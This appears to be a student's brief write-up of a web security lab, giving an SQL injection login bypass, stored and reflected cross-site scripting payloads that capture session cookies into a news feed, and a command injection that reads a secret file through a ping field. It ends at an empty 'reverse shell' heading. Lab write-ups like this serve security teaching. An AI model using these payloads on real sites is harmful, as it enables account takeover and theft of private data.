Part 1: SQL Injection

login as
	user	:	alice@alice.com';--
	password: anything
 
 this will cut the query and execute before it checks for password



 Part 2: Cross-Site Scripting

 **Second order (persistent) attack**
 as each news are a list item, we can use 

    </li> [our actual code] <li>

to inject our code to the news.
In this case we use

<script> document.write("<img src=/news?text="+document.cookie+">") </script>

so that everytime someone sees their news feed, the injected code will print their session into the news feed database.


**first order attack**

instead of an image file that loads automatically, now we have a link that points to the same url

<a href="#" onclick="expose()"> reddit.com/r/funny <script> function expose() { window.location="/news?text="+document.cookie}</script> </a>

putting it in a simple html doesnt work because the cookies are not the same.


**listing secret file**

Using ping input field, we can add an additional shell command by inputting

    localhost && <another command>

in this case, displaying the contents of secret file will need

    localhost && cat secrets

**opening reverse shell**





